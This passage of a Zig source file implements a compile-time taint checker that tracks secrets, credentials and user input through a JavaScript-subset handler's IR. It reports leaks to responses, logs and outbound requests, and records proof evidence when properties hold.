//! Compile-Time Data Flow Provenance Checker
//!
//! Tracks where data comes from (sources with labels) and where it goes
//! (sinks with policies), proving security properties at compile time:
//!   - Secrets (env vars with sensitive names) never reach response bodies
//!   - Credentials (auth tokens, JWTs) never appear in logs
//!   - User input is validated before use in external egress
//!
//! This is possible because zttp's JS subset has no eval, no exceptions,
//! no dynamic property access beyond known patterns, and virtual modules are
//! the ONLY I/O boundary. The IR tree IS the control flow graph. Data flow
//! analysis is a simple recursive tree walk, not an expensive fixpoint.
//!
//! Labels are auto-derived from ModuleBinding.return_labels and refined by
//! env var naming conventions. No user annotations required for basic proofs.

const std = @import("std");
const stripper = @import("zts-engine").stripper;
const diagnostic_catalog = @import("diagnostic_catalog.zig");
const source_frontend = @import("zts-engine").source_frontend;
const ir = @import("zts-engine").parser.ir;
const object = @import("zts-engine").object;
const atom_table = @import("zts-engine").atom_table;
const builtin_modules = @import("zts-engine").builtin_modules;
const module_facts_mod = @import("module_facts.zig");
const route_resolution = @import("route_resolution.zig");
const contract_types = @import("zts-contracts").contract_types;
const type_checker_mod = @import("type_checker.zig");
const mb = @import("zts-engine").module_binding;
const bool_checker_mod = @import("bool_checker.zig");
const known_globals = @import("zts-base").known_globals;
const counterexample = @import("counterexample.zig");
const repair_intent_mod = @import("repair_intent.zig");

pub const RepairIntent = repair_intent_mod.RepairIntent;

const Node = ir.Node;
const NodeIndex = ir.NodeIndex;
const NodeTag = ir.NodeTag;
const IrView = ir.IrView;
const null_node = ir.null_node;
const LabelSet = mb.LabelSet;
const DataLabel = mb.DataLabel;

const packBindingKey = bool_checker_mod.packBindingKey;

// ---------------------------------------------------------------------------
// Diagnostic types
// ---------------------------------------------------------------------------

pub const Severity = enum {
    err,
    warning,

    pub fn label(self: Severity) []const u8 {
        return switch (self) {
            .err => "error",
            .warning => "warning",
        };
    }
};

pub const DiagnosticKind = enum {
    secret_in_response, // {secret} data in Response body/headers
    credential_in_response, // {credential} data in Response body
    secret_in_log, // {secret} data in console.log/warn/error
    credential_in_log, // {credential} data in console.log/warn/error
    secret_in_egress_url, // {secret} data in fetchSync URL
    credential_in_egress_url, // {credential} data in fetchSync URL
    secret_in_egress_body, // {secret} data in fetchSync body
    unvalidated_input_in_egress, // {user_input} without {validated} in fetchSync
};

/// Snapshot of the branch constraints and module calls observed on the
/// path that witnessed a flow sink. Present on diagnostics whose kind
/// maps to a `counterexample.PropertyTag`; the solver turns it into an
/// executable request + stub sequence. Owned by the FlowChecker
/// allocator; freed in `FlowChecker.deinit`.
pub const Witness = struct {
    path_constraints: []const counterexample.WitnessConstraint,
    io_calls: []const counterexample.TrackedIoCall,
};

pub const Diagnostic = struct {
    severity: Severity,
    kind: DiagnosticKind,
    node: NodeIndex,
    message: []const u8,
    help: ?[]const u8,
    witness: ?Witness = null,
    /// Typed repair primitive the agent uses to pick an apply step directly.
    ///
    /// Always null here, and a test over the kind set holds it that way. Every
    /// flow diagnostic reports a labelled value reaching a sink; the label is
    /// what fails the proof, and no conditional removes a label. The checker
    /// used to offer `insert_guard_before_line` on all of them, which sent an
    /// agent looking for a guard that could not exist.
    repair_intent: ?RepairIntent = null,
};

/// How a flow property was *held* (proven safe), captured for the green-proof
/// card. The passing-case sibling of `Witness`: where `Witness` records the
/// path that breaks a property, a `DefendedPath` records why the property
/// could not be broken. Two shapes:
///   - `.validated`: a tainted value reached a sink but carried `.validated`,
///     i.e. it passed a named validator first. `guard_func` is the validator.
///   - `.never_reached`: a tainted value was read but reached no sink at all.
///     No guard is named (none exists); the value is simply contained.
///
/// Soundness: a `.validated` path is emitted ONLY when the specific validator
/// binding is recovered from the sink expression's `result.value` provenance.
/// If the guard cannot be named, no path is recorded - the property still
/// proves true, it just carries no resisted card. The evidence is always
/// derived from what the prover observed, never fabricated.
pub const SafeForm = enum { validated, never_reached };

pub const DefendedPath = struct {
    property: counterexample.PropertyTag,
    safe_form: SafeForm,
    /// Validator function name, present iff `safe_form == .validated`.
    /// Borrowed from `module_fn_meta` (checker-lifetime); never freed here.
    guard_func: ?[]const u8 = null,
    guard_line: u32 = 0,
    /// Human label of the sink the validated value safely reached
    /// (static literal); "" for `.never_reached`.
    sink_label: []const u8 = "",
    sink_line: u32 = 0,
};

/// The validator call that produced a `.validated` binding, recorded so a
/// defended path can name the guard. `node` resolves to the call's source loc.
const GuardInfo = struct {
    func: []const u8,
    node: NodeIndex,
};

/// Map a diagnostic kind to the property tag it witnesses. `null` when the
/// diagnostic does not correspond to a currently modelled property (the
/// counterexample surface is a subset of flow diagnostics by design).
pub fn propertyTagForKind(kind: DiagnosticKind) ?counterexample.PropertyTag {
    return switch (kind) {
        .secret_in_response,
        .secret_in_log,
        .secret_in_egress_url,
        .secret_in_egress_body,
        => .no_secret_leakage,
        .credential_in_response,
        .credential_in_log,
        .credential_in_egress_url,
        => .no_credential_leakage,
        .unvalidated_input_in_egress => .injection_safe,
    };
}

/// Proven data flow properties for a handler.
pub const FlowProperties = struct {
    /// No {secret} data reaches response bodies, headers, or external egress.
    no_secret_leakage: bool = true,
    /// No {credential} data reaches response bodies or logs.
    no_credential_leakage: bool = true,
    /// All {user_input} data passes through validation before external egress.
    input_validated: bool = true,
    /// {user_input} data does not flow to external egress hosts.
    pii_contained: bool = true,
    /// No unvalidated user input reaches sensitive sinks (egress, HTML responses).
    injection_safe: bool = true,
    /// No clock- or RNG-derived value reaches the response.
    ///
    /// Only ever falsified here. The capability rule in effect inference is the
    /// other source - it sees `Date.now()`, which is a global member call and
    /// never a labelled module import - so the two are ANDed rather than one
    /// replacing the other.
    deterministic: bool = true,
};

// ---------------------------------------------------------------------------
// Declared classifications (M4 T4, producer obligations P8 and P9)
// ---------------------------------------------------------------------------

const declaration = @import("zts-base").declaration;
pub const Declaration = declaration.Declaration;

/// What the analysis established about one declared classification (P8). The
/// order is the order of strength: a status only ever moves up.
pub const EntryStatus = enum(u2) {
    /// The analysis never produced a value from the entry's source, or never
    /// reached the path or an aggregate above it.
    absent = 0,
    /// The entry applied only through an aggregate that contains the path, a
    /// computed read, or a fetch whose source could not be named.
    indeterminate = 1,
    /// An expression was evaluated at the entry's exact path, or below it.
    matched = 2,
};

/// Where a value came from, when it came from a declared source. Only a const
/// binding keeps one, so an alias is tracked and a reassigned name is not.
/// One declared source: a fetch host or a service name.
const DeclaredSource = struct {
    kind: declaration.SourceKind,
    name: []const u8,
};

fn findSource(sources: []const DeclaredSource, kind: declaration.SourceKind, name: []const u8) ?u16 {
    for (sources, 0..) |source, i| {
        if (source.kind == kind and std.mem.eql(u8, source.name, name)) return @intCast(i);
    }
    return null;
}

const Origin = struct {
    /// Index of the source among `origin_sources`, or null for a fetch whose
    /// URL is not a literal: every fetch entry then applies by path.
    source: ?u16,
    kind: declaration.SourceKind,
    part: enum { response, body },
    /// Path segments from the body root, borrowed from the atom table.
    depth: u8 = 0,
    segments: [max_origin_depth][]const u8 = undefined,

    /// Deeper than any declared path can be: relations are decided by the
    /// first `max_origin_depth` segments, so the rest need not be kept.
    const max_origin_depth = 17;

    fn path(self: *const Origin) []const []const u8 {
        return self.segments[0..self.depth];
    }

    fn child(self: Origin, segment: []const u8) Origin {
        var out = self;
        if (out.depth < max_origin_depth) {
            out.segments[out.depth] = segment;
            out.depth += 1;
        }
        return out;
    }
};

// ---------------------------------------------------------------------------
// FlowChecker
// ---------------------------------------------------------------------------

/// Caps for callee return-label summaries and return-value resolution. Beyond
/// these the checker falls back to the conservative direction: the call's value
/// carries `.unknown`, so a sink it reaches clears what it governs instead of
/// proving it. The caps therefore cost precision, never soundness. The summary
/// is not memoized, so a call site re-walks the callee body, and the depth is
/// what bounds that work.
const max_summary_params = 8;
const max_summary_depth = 8;
/// Deepest expression `scanExprSinks` reads before it gives up and clears the
/// sink properties.
const max_scan_depth = 256;
/// Bound on the passes that a recursive summary may take when its parameter
/// labels keep widening. The labels are a fixed set of flags, so the widening
/// ends well before this; reaching it fails closed.
const max_fixpoint_passes = 16;
const response_resolve_limit = 16;

pub const FlowChecker = struct {
    allocator: std.mem.Allocator,
    ir_view: IrView,
    atoms: ?*atom_table.AtomTable,
    diagnostics: std.ArrayList(Diagnostic),

    /// Per-binding labels: packed(scope_id, slot) -> LabelSet.
    binding_labels: std.AutoHashMapUnmanaged(u32, LabelSet),
    /// Virtual module import tracking: local slot -> FunctionBinding return_labels.
    module_fn_labels: std.AutoHashMapUnmanaged(u16, LabelSet),
    /// Virtual module function metadata (module name, function name, return kind),
    /// keyed by the same slot as `module_fn_labels`. Populated by `scanImports`
    /// and consumed by the counterexample-witness capture pipeline.
    module_fn_meta: std.AutoHashMapUnmanaged(u16, counterexample.StubInfo),
    /// Slots of imported exports that declare `derives_from_args`: their result
    /// can contain what an argument carried, so the call's labels are the union
    /// of the arguments' rather than the declared set alone.
    module_fn_arg_derived: std.AutoHashMapUnmanaged(u16, void),
    /// Slots of imported exports that declare `declassify_bound_arg`, mapped to
    /// that argument index. The export's declared labels replace its input's -
    /// that is what makes it a declassifier - but only while the named argument
    /// is a compile-time literal. `mask(text, visible)` reveals the trailing
    /// `visible` bytes, so a runtime `visible` puts the magnitude of the
    /// declassification in whatever computes it.
    module_fn_declassify_bound: std.AutoHashMapUnmanaged(u16, u8),
    /// Return labels for functions imported from another file, local slot ->
    /// labels. The checker has no file access, so the caller computes these
    /// with `exportedReturnLabels` over the imported module and installs them
    /// before `check`. Without them a cross-file call is untraceable and costs
    /// every property its value's sink decides.
    file_fn_labels: std.AutoHashMapUnmanaged(u16, LabelSet),
    /// Per-binding origin: packed(scope_id, slot) -> metadata for the module
    /// call that initialised this binding. Lets the constraint extractor emit
    /// per-call stub constraints on `if (binding)` patterns.
    binding_origin: std.AutoHashMapUnmanaged(u32, counterexample.StubInfo),
    /// Result binding tracking: packed(scope_id, slot) -> return_labels from the producing call.
    /// When accessing .value on these bindings, the return_labels are merged in.
    result_binding_labels: std.AutoHashMapUnmanaged(u32, LabelSet),
    /// Defining value nodes per binding: packed(scope_id, slot) -> every init
    /// and assignment value recorded during the walk. Lets the response-sink
    /// check resolve a returned identifier back to the Response call(s) that
    /// produced it; without this, `const r = Response.html(x); return r;`
    /// skips the sink analysis entirely.
    binding_value_nodes: std.AutoHashMapUnmanaged(u32, std.ArrayListUnmanaged(NodeIndex)),
    /// User function declarations: packed binding key -> function expression
    /// node. Feeds callee return-label summaries in `userCallLabels`.
    user_fn_decls: std.AutoHashMapUnmanaged(u32, NodeIndex),
    /// Binding keys of imported names. An import holds no datum a walk could
    /// label, so a read of one is exempt from the unlabeled-global fallback in
    /// `inferLabels`. Populated by `scanFunctionDecls`.
    import_bindings: std.AutoHashMapUnmanaged(u32, void) = .empty,
    /// True while `walkModuleDeclarations` runs. A module-level call happens at
    /// load, not on a request path, so it must not enter the witness's stub
    /// sequence (`trackModuleCallInit`).
    walking_module_level: bool = false,
    /// The declaration each captured read names: identifier node -> the
    /// binding of the declaration it captures. The scope analyzer keys a
    /// captured variable by the inner function and an upvalue slot, which
    /// names no declaration and collides with that function's own locals.
    /// `resolveCaptures` fills this from the lexical nesting of the IR, so it
    /// does not depend on the order in which the walk reaches a closure.
    capture_targets: std.AutoHashMapUnmanaged(NodeIndex, ir.BindingRef) = .empty,
    /// Function bodies resolved from literal route tables passed to
    /// `routerMatch`. Each is walked as a request root after the handler.
    route_function_roots: std.ArrayListUnmanaged(NodeIndex),
    /// Route functions for every tool named by the current agent entry. A
    /// `callTool` result carries the union of these summaries regardless of
    /// the runtime `name`, because that name is model-controlled.
    listed_tool_route_functions: std.ArrayListUnmanaged(NodeIndex),
    listed_tool_routes_ready: bool,
    /// True when the catalog-to-route mapping was incomplete. A `callTool`
    /// call then contributes `.unknown` and cannot discharge a flow proof.
    listed_tool_routes_unresolved: bool,
    /// When non-null, the walk is summarizing a callee body: return statements
    /// merge their labels here instead of running response-sink checks.
    /// Expression sinks (log, egress) still run, with the parameters bound from
    /// the call site, so a sink inside a called function reports the labels
    /// that call passes it. `addDiagnostic` deduplicates the repeats that
    /// re-walking a callee per call site produces.
    summary_returns: ?*LabelSet,
    /// Callee summaries in progress (recursion guard).
    summary_stack: [max_summary_depth]u32,
    /// The call expression that entered each summary frame, parallel to
    /// `summary_stack`. `null_node` when the frame was entered without a call,
    /// such as a closure literal walked where it is written. The outermost
    /// real entry names where a diagnostic's chain starts.
    summary_call_sites: [max_summary_depth]NodeIndex,
    /// The labels each parameter of a summary frame was bound with, parallel to
    /// `summary_stack`. Only a frame that `functionCallLabels` entered records
    /// them (`summary_rewalks`); a recursive call into the frame compares its
    /// argument labels against these.
    summary_bound: [max_summary_depth][max_summary_params]LabelSet,
    /// True for a frame whose owner can walk it again, which is what lets a
    /// recursive call widen `summary_bound`. Every other frame has no owner
    /// that re-walks, so a recursive call that would widen it fails closed.
    summary_rewalks: [max_summary_depth]bool,
    /// True once a recursive call widened `summary_bound` of the frame and the
    /// owner has not walked the body with the wider labels yet.
    summary_widened: [max_summary_depth]bool,
    /// The function or object literal that the call site now being summarized
    /// passed for a parameter: packed parameter binding key -> node. Saved and
    /// restored around each `functionCallLabels` frame, so a binding made for
    /// one call site cannot be read by another. Lets `f(t)` inside
    /// `apply(f, t)` resolve to the closure the caller passed.
    param_values: std.AutoHashMapUnmanaged(u32, NodeIndex),
    /// The call expression `inferLabels` is evaluating now, so a summary frame
    /// can record the call that entered it. `null_node` outside any call.
    active_call_node: NodeIndex = null_node,
    summary_depth: u8,
    /// Nonzero only while a `routerMatch` dispatch unions route returns.
    /// Response summaries then follow the runtime's payload-only surface.
    route_summary_depth: u8,
    /// Nonzero only while a `routerMatch` dispatch or a listed-tool summary
    /// walks a function that `check` also walks as a request root. That root walk reports the
    /// function's sinks, so `addDiagnostic` drops the dispatch walk's copies.
    /// A dispatch target that is not a root reports in the dispatch walk.
    root_dispatch_depth: u8 = 0,
    /// The `Response.html` calls that built an `unsafe_html` fact while the
    /// current response value is evaluated; see `noteHtmlProducer`.
    html_producers: std.ArrayListUnmanaged(NodeIndex) = .empty,
    /// Bindings that stand for the request or its headers, other than the
    /// handler's own parameter (`req_binding_key`): a parameter bound at a call
    /// site to the request, and a name initialised from it. See `carrierKind`.
    request_carriers: std.AutoHashMapUnmanaged(u32, CarrierKind) = .empty,
    /// Guard provenance for validated bindings: packed(scope_id, slot) -> the
    /// validator call that set the `.validated` label. Lets a defended path
    /// name the guard ("validated by schemaCompile()"). Populated alongside
    /// `result_binding_labels` in `trackResultBinding`.
    result_binding_guard: std.AutoHashMapUnmanaged(u32, GuardInfo),
    /// Passing-case evidence: why each held flow property could not be broken.
    /// The green-proof sibling of `diagnostics`. Strings are borrowed
    /// (checker-lifetime / static); only the list backing is freed.
    defended_paths: std.ArrayListUnmanaged(DefendedPath),
    /// Handler request parameter binding key (packed scope_id + slot).
    req_binding_key: ?u32,
    /// Whether `req.subject` and `req.tenant` still hold what the runtime
    /// verified (M4 T5). False once any assignment in the program could write
    /// either field or rebind the request, so a read then keeps the request's
    /// `user_input` label: a handler cannot launder input through them.
    req_identity_trusted: bool = false,
    /// Slot of the `env` function import (for smart label refinement).
    env_fn_slot: ?u16,
    /// Shared import index, injected by the orchestrator when one exists.
    /// Borrowed; must outlive the checker. Null means build a private one.
    facts: ?*const module_facts_mod.ModuleFacts = null,
    /// The authoritative type session for this IR, when the typed frontend ran.
    /// Borrowed; used only to recognize primitive and array receivers that the
    /// stripped IR cannot identify, such as a parameter declared `string`.
    type_checker: ?*type_checker_mod.TypeChecker = null,
    owned_facts: ?module_facts_mod.ModuleFacts = null,
    /// Constraint stack maintained as `walkStmt` descends into conditional
    /// branches. Snapshotted onto every diagnostic at emission time.
    working_constraints: std.ArrayListUnmanaged(counterexample.WitnessConstraint),
    /// Ordered list of virtual-module calls observed by the current walk.
    /// Snapshotted alongside `working_constraints` on diagnostics.
    working_io_calls: std.ArrayListUnmanaged(counterexample.TrackedIoCall),

    /// The consumer's declared classifications (M4 T4). Borrowed; must outlive
    /// the checker. Null means none were declared.
    declaration: ?*const Declaration = null,
    /// One status per classification, in the declaration's order (P8).
    entry_status: []EntryStatus = &.{},
    /// Distinct declared sources, their names borrowed from the declaration.
    /// An origin names its source by index.
    origin_sources: std.ArrayListUnmanaged(DeclaredSource) = .empty,
    /// The origin of each const binding whose initializer had one.
    binding_origins: std.AutoHashMapUnmanaged(u32, Origin) = .empty,
    /// The last classification that contributed each label, for the reason a
    /// leak diagnostic names.
    last_declared_secret: ?u32 = null,
    last_declared_credential: ?u32 = null,
    /// Nonzero while the object of a member read is evaluated: an aggregate
    /// read only to reach one of its members is not forwarded (P8).
    member_object_depth: u8 = 0,
    /// Dynamically formatted diagnostic messages that need freeing.
    allocated_messages: std.ArrayListUnmanaged([]const u8),

    properties: FlowProperties,
    /// Sticky failure for taint labels, provenance, defended paths,
    /// constraints, witnesses, and diagnostics. Human-only reason/message
    /// enrichment may fall back to its base text without weakening a proof.
    allocation_failed: bool = false,

    pub fn init(allocator: std.mem.Allocator, ir_view: IrView, atoms: ?*atom_table.AtomTable) FlowChecker {
        return .{
            .allocator = allocator,
            .ir_view = ir_view,
            .atoms = atoms,
            .diagnostics = .empty,
            .binding_labels = .empty,
            .module_fn_labels = .empty,
            .module_fn_meta = .empty,
            .module_fn_arg_derived = .empty,
            .module_fn_declassify_bound = .empty,
            .file_fn_labels = .empty,
            .binding_origin = .empty,
            .result_binding_labels = .empty,
            .result_binding_guard = .empty,
            .binding_value_nodes = .empty,
            .user_fn_decls = .empty,
            .route_function_roots = .empty,
            .listed_tool_route_functions = .empty,
            .listed_tool_routes_ready = false,
            .listed_tool_routes_unresolved = false,
            .summary_returns = null,
            .summary_stack = @splat(0),
            .summary_call_sites = @splat(null_node),
            .summary_bound = @splat(@splat(LabelSet.empty)),
            .summary_rewalks = @splat(false),
            .summary_widened = @splat(false),
            .param_values = .empty,
            .summary_depth = 0,
            .route_summary_depth = 0,
            .defended_paths = .empty,
            .req_binding_key = null,
            .env_fn_slot = null,
            .working_constraints = .empty,
            .working_io_calls = .empty,
            .allocated_messages = .empty,
            .properties = .{},
            .allocation_failed = false,
        };
    }

    pub fn deinit(self: *FlowChecker) void {
        for (self.diagnostics.items) |d| {
            if (d.witness) |w| {
                if (w.path_constraints.len > 0) self.allocator.free(w.path_constraints);
                if (w.io_calls.len > 0) self.allocator.free(w.io_calls);
            }
        }
        self.diagnostics.deinit(self.allocator);
        self.binding_labels.deinit(self.allocator);
        if (self.owned_facts) |*owned| owned.deinit();
        self.module_fn_labels.deinit(self.allocator);
        self.module_fn_meta.deinit(self.allocator);
        self.module_fn_arg_derived.deinit(self.allocator);
        self.module_fn_declassify_bound.deinit(self.allocator);
        self.file_fn_labels.deinit(self.allocator);
        self.binding_origin.deinit(self.allocator);
        self.working_constraints.deinit(self.allocator);
        self.working_io_calls.deinit(self.allocator);
        self.result_binding_labels.deinit(self.allocator);
        self.result_binding_guard.deinit(self.allocator);
        self.defended_paths.deinit(self.allocator);
        var value_node_iter = self.binding_value_nodes.valueIterator();
        while (value_node_iter.next()) |list| {
            list.deinit(self.allocator);
        }
        self.binding_value_nodes.deinit(self.allocator);
        self.user_fn_decls.deinit(self.allocator);
        self.import_bindings.deinit(self.allocator);
        self.capture_targets.deinit(self.allocator);
        self.html_producers.deinit(self.allocator);
        self.request_carriers.deinit(self.allocator);
        self.param_values.deinit(self.allocator);
        self.route_function_roots.deinit(self.allocator);
        self.listed_tool_route_functions.deinit(self.allocator);

        // Free dynamically formatted diagnostic messages
        for (self.allocated_messages.items) |msg| {
            self.allocator.free(msg);
        }
        self.allocated_messages.deinit(self.allocator);

        if (self.entry_status.len > 0) self.allocator.free(self.entry_status);
        self.origin_sources.deinit(self.allocator);
        self.binding_origins.deinit(self.allocator);
    }

    /// Run the flow analysis on the given handler function node.
    /// Returns the number of errors found.
    pub fn check(self: *FlowChecker, handler_func: NodeIndex) !u32 {
        self.scanImports();
        self.scanFunctionDecls();
        self.scanRouteFunctionRoots();
        self.scanListedToolRoutes();
        self.resolveCaptures();
        self.walkModuleDeclarations();
        self.findHandlerParam(handler_func);
        self.walkStmt(handler_func);

        const handler_req_key = self.req_binding_key;
        const handler_identity_trusted = self.req_identity_trusted;
        {
            const handler_constraints = self.working_constraints;
            const handler_io = self.working_io_calls;
            self.working_constraints = .empty;
            self.working_io_calls = .empty;
            defer {
                self.working_constraints.deinit(self.allocator);
                self.working_io_calls.deinit(self.allocator);
                self.working_constraints = handler_constraints;
                self.working_io_calls = handler_io;
            }
            for (self.route_function_roots.items) |route_func| {
                self.working_constraints.clearRetainingCapacity();
                self.working_io_calls.clearRetainingCapacity();
                self.req_binding_key = null;
                self.req_identity_trusted = false;
                self.findHandlerParam(route_func);
                self.walkStmt(route_func);
            }
        }
        self.req_binding_key = handler_req_key;
        self.req_identity_trusted = handler_identity_trusted;
        self.recordContainedSecrets();
        if (self.allocation_failed) return error.OutOfMemory;

        var error_count: u32 = 0;
        for (self.diagnostics.items) |diag| {
            if (diag.severity == .err) error_count += 1;
        }
        return error_count;
    }

    /// Labels a module call inherits from closures passed to it. A module
    /// export answers with its declared return labels, which describe what the
    /// module itself produces and cannot describe what a caller's callback
    /// returns: `parallel([() => env("SECRET_KEY")])` declares `external` and
    /// the secret vanished.
    ///
    /// Only closures contribute. Unioning every argument would taint results
    /// that carry no argument data - `cacheSet("ns", key, userInput)` answers a
    /// boolean, not the user's data - and the pass-through shape that needs
    /// this is always a callback the module invokes: `parallel`, `race`,
    /// `step`, `call`, `saga`, `using`.
    ///
    /// `nondeterministic` is dropped for a durable export, and only that label:
    /// the callback's value is recorded on the first run and replayed after, so
    /// it is the same on every run, while a secret it returns is still a secret
    /// in the response.
    fn closureArgLabels(self: *FlowChecker, slot: u16, call_data: Node.CallExpr) LabelSet {
        const is_durable = if (self.module_fn_meta.get(slot)) |meta|
            std.mem.eql(u8, meta.module, "durable")
        else
            false;

        var labels = LabelSet.empty;
        for (0..call_data.args_count) |i| {
            const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));

            // Whether a closure is present is a question about the argument's
            // shape, not about the labels it produced: `() => Date.now()` under
            // a durable export produces exactly one label and then loses it, so
            // an emptiness test would read it as "no closure here" and fall to
            // the eager branch that puts the label back.
            if (self.closuresWithin(arg)) |from_closure| {
                var l = from_closure;
                if (is_durable) l.nondeterministic = false;
                labels = LabelSet.merge(labels, l);
            } else if (is_durable) {
                // Only what a closure returns is replayed. `step("ts",
                // Date.now())` reads the clock before `step` is ever called, so
                // no replay reproduces that value and the eager form keeps the
                // label the callback form loses.
                labels = LabelSet.merge(labels, self.inferLabels(arg));
            }
        }
        return labels;
    }

    /// Union of what every closure inside `node` produces, or null when `node`
    /// holds no closure at all. Null and the empty set are different answers: a
    /// callback that returns nothing labelled still went through a call the
    /// module makes, and a durable export replays only what such a call
    /// returned. Testing emptiness instead would read `() => Date.now()` under
    /// `step` - one label, then dropped as replayed - as "no closure here".
    ///
    /// Descends through the array and object literals a callback is usually
    /// wrapped in, and ignores every other value.
    fn closuresWithin(self: *FlowChecker, node: NodeIndex) ?LabelSet {
        if (node == null_node) return null;
        const tag = self.ir_view.getTag(node) orelse return null;
        switch (tag) {
            .arrow_function, .function_expr => return self.closureResultLabels(node),
            .array_literal => {
                const arr = self.ir_view.getArray(node) orelse return null;
                var labels: ?LabelSet = null;
                var i: u16 = 0;
                while (i < arr.elements_count) : (i += 1) {
                    const elem = self.ir_view.getListIndex(arr.elements_start, i);
                    if (self.closuresWithin(elem)) |found| {
                        labels = LabelSet.merge(labels orelse LabelSet.empty, found);
                    }
                }
                return labels;
            },
            .object_literal => {
                const obj = self.ir_view.getObject(node) orelse return null;
                var labels: ?LabelSet = null;
                var i: u16 = 0;
                while (i < obj.properties_count) : (i += 1) {
                    const prop_idx = self.ir_view.getListIndex(obj.properties_start, i);
                    if ((self.ir_view.getTag(prop_idx) orelse continue) != .object_property) continue;
                    const prop = self.ir_view.getProperty(prop_idx) orelse continue;
                    if (self.closuresWithin(prop.value)) |found| {
                        labels = LabelSet.merge(labels orelse LabelSet.empty, found);
                    }
                }
                return labels;
            },
            // A closure bound to a name and passed by that name. Resolved
            // through the same declaration index the user-call summary uses,
            // because the identifier's own labels are not consulted here - only
            // closures contribute, and answering `inferLabels` for every
            // identifier would taint results that carry no argument data.
            .identifier => {
                const binding = self.bindingAt(node) orelse return null;
                const key = packBindingKey(binding.scope_id, binding.slot);
                const fn_node = self.user_fn_decls.get(key) orelse return null;
                return self.closureResultLabels(fn_node);
            },

            // exhaustive: this function looks for closures a module will call,
            // and the arms above are the shapes one arrives in - bare, in an
            // array, as an object field, or under a name. No other tag can hold
            // a closure the callee invokes without going through one of them.
            // Null owes nothing here: it reports that the argument is a plain
            // value, which is what tells the two durable forms apart.
            else => return null,
        }
    }

    /// Labels of the value a closure produces when called. Parameters are left
    /// as they are: a caller that passes a labelled argument unions it in
    /// separately, and a higher-order function supplying the argument itself
    /// (the element in `map`) contributes the receiver's labels through the
    /// same union. Recursion is bounded by the same summary stack the
    /// user-function path uses.
    fn closureResultLabels(self: *FlowChecker, node: NodeIndex) LabelSet {
        return self.closureResultLabelsBound(node, null);
    }

    /// `closureResultLabels` for a closure whose caller supplies its
    /// arguments. `param_labels` is what a higher-order method hands the
    /// callback: `[s].map((x) => ...)` passes the receiver's elements, so each
    /// parameter carries the receiver's labels while the body is walked. Null
    /// leaves the parameters as they are. The labels travel as an argument and
    /// not as checker state, so no exit path can leave a stale binding source
    /// behind for the next closure.
    fn closureResultLabelsBound(self: *FlowChecker, node: NodeIndex, param_labels: ?LabelSet) LabelSet {
        const func = self.ir_view.getFunction(node) orelse return self.unresolvedCallLabels(LabelSet.empty);
        if (self.summary_depth >= max_summary_depth) return self.unresolvedCallLabels(LabelSet.empty);
        for (self.summary_stack[0..self.summary_depth]) |active| {
            if (active == node) return LabelSet.empty;
        }

        if (param_labels) |labels| {
            for (0..func.params_count) |i| {
                const param_idx = self.ir_view.getListIndex(func.params_start, @intCast(i));
                const pb = self.paramBinding(param_idx) orelse continue;
                const key = packBindingKey(pb.scope_id, pb.slot);
                self.binding_labels.put(self.allocator, key, labels) catch self.markAllocationFailure();
            }
        }

        self.pushSummaryFrame(node, false);
        defer self.summary_depth -= 1;

        const body_tag = self.ir_view.getTag(func.body) orelse return self.unresolvedCallLabels(LabelSet.empty);
        if (body_tag == .block or body_tag == .program or body_tag == .return_stmt) {
            var collected = LabelSet.empty;
            const saved = self.summary_returns;
            self.summary_returns = &collected;
            defer self.summary_returns = saved;
            self.walkStmt(func.body);
            return collected;
        }
        return self.exprBodyLabels(func.body);
    }

    /// The labels of a function body that is a bare expression, with the sinks
    /// inside it checked. A concise arrow body is normally a `return_stmt`, which
    /// `walkStmt` checks; this covers a body the parser leaves as the expression.
    fn exprBodyLabels(self: *FlowChecker, body: NodeIndex) LabelSet {
        const labels = self.inferLabels(body);
        self.scanExprSinks(body);
        return labels;
    }

    /// Push a summary frame for `node`. The caller decrements `summary_depth`
    /// when the walk ends. `rewalks` is true only for a frame whose owner
    /// walks the body again when a recursive call widens its parameter labels.
    fn pushSummaryFrame(self: *FlowChecker, node: NodeIndex, rewalks: bool) void {
        const frame = self.summary_depth;
        self.summary_stack[frame] = node;
        self.summary_call_sites[frame] = self.active_call_node;
        // The labels the parameters carry as the frame opens: what the owner
        // bound them to, which a recursive call is compared against.
        self.summary_bound[frame] = @splat(LabelSet.empty);
        if (self.ir_view.getFunction(node)) |func| {
            for (0..@min(func.params_count, max_summary_params)) |i| {
                const param_idx = self.ir_view.getListIndex(func.params_start, @intCast(i));
                const pb = self.paramBinding(param_idx) orelse continue;
                const key = packBindingKey(pb.scope_id, pb.slot);
                self.summary_bound[frame][i] = self.binding_labels.get(key) orelse LabelSet.empty;
            }
        }
        self.summary_rewalks[frame] = rewalks;
        self.summary_widened[frame] = false;
        self.summary_depth += 1;
    }

    /// Record the return labels of a function imported from another file,
    /// keyed by the local binding slot the import produced. Call before
    /// `check`; the labels come from `exportedReturnLabels` run over that file.
    pub fn setFileFunctionLabels(self: *FlowChecker, slot: u16, labels: LabelSet) void {
        self.file_fn_labels.put(self.allocator, slot, labels) catch self.markAllocationFailure();
    }

    /// Install the agent-to-tool mapping from the catalog that contract
    /// extraction accepted. Production precompile uses this path, so runtime
    /// lowering and flow inference consume the same names and route strings.
    /// Standalone checker callers fall back to the conservative literal scan.
    pub fn setAcceptedToolCatalog(self: *FlowChecker, entries: []const contract_types.ToolEntry) !void {
        const facts = self.resolveFacts() orelse {
            self.listed_tool_routes_ready = true;
            self.listed_tool_routes_unresolved = true;
            return;
        };
        const agent_entry = for (entries) |*entry| {
            if (entry.agent != null) break entry;
        } else return;

        self.listed_tool_route_functions.clearRetainingCapacity();
        self.listed_tool_routes_ready = true;
        self.listed_tool_routes_unresolved = false;
        const resolver = route_resolution.Resolver.init(self.ir_view, self.atoms, facts);
        for (agent_entry.agent.?.tools.items) |tool_name| {
            const tool = for (entries) |*entry| {
                if (std.mem.eql(u8, entry.name, tool_name)) break entry;
            } else {
                self.listed_tool_routes_unresolved = true;
                continue;
            };
            if (tool.agent != null) {
                self.listed_tool_routes_unresolved = true;
                continue;
            }
            var targets = try resolver.resolveRouteKey(self.allocator, tool.route);
            defer targets.deinit(self.allocator);
            if (targets.unresolved) self.listed_tool_routes_unresolved = true;
            for (targets.functions.items) |function| {
                if (std.mem.indexOfScalar(NodeIndex, self.listed_tool_route_functions.items, function) != null) continue;
                try self.listed_tool_route_functions.append(self.allocator, function);
            }
        }
    }

    /// Return labels of the exported function named `name`, for a caller in
    /// another module. Parameters are left unlabelled: the caller unions this
    /// with its own argument labels, and a label reaching the return came
    /// either from an argument, which that union covers, or from the body,
